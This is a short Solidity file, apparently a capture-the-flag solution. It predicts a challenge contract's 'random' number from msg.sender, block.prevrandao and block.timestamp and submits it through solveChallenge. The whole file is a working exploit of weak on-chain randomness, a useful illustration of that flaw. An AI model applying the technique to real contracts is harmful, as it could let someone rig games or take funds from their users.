// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

address constant CHALLENGE_ADDRESS = 0xdF7cdFF0c5e85c974D6377244D9A0CEffA2b7A86;

contract Exploit {
    function exec() public {
        Target target = Target(CHALLENGE_ADDRESS);
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(msg.sender, block.prevrandao, block.timestamp)
            )
        ) % 100000;

        target.solveChallenge(answer, "kethcode");
    }
}

contract Target {
    function solveChallenge(
        uint256 randomGuess,
        string memory yourTwitterHandle
    ) external {}
}